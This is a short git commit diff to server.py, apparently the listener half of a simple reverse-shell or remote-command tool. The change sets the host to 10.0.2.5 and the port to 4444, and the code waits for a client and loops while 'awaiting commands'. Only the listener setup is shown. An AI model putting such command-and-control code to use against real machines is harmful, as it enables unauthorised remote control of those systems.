9c43c7d14bc7583a210534fecb0db39a687faec3
albertuslaksana <89668012+albertuslaksana@users.noreply.github.com>
2023-03-08 00:26:03 -0600

    Update server.py

--- server.py
+++ server.py
@@ -1,15 +1,15 @@
 import socket
 import subprocess
 
-HOST = '127.0.0.1' # '192.168.43.82'
-PORT = 8081 # 2222
+HOST = '10.0.2.5'
+PORT = 4444 
 server = socket.socket()
 server.bind((HOST, PORT))
 print('[+] Server Started')
 print('[+] Listening For Client Connection ...')
 server.listen(1)
 client, client_addr = server.accept()
-print(f'[+] {client_addr} Client connected to the server')
+print(f"[+] {client_addr} Client connected to the server")
 
 while True:
     print("[-] Awaiting commands...")
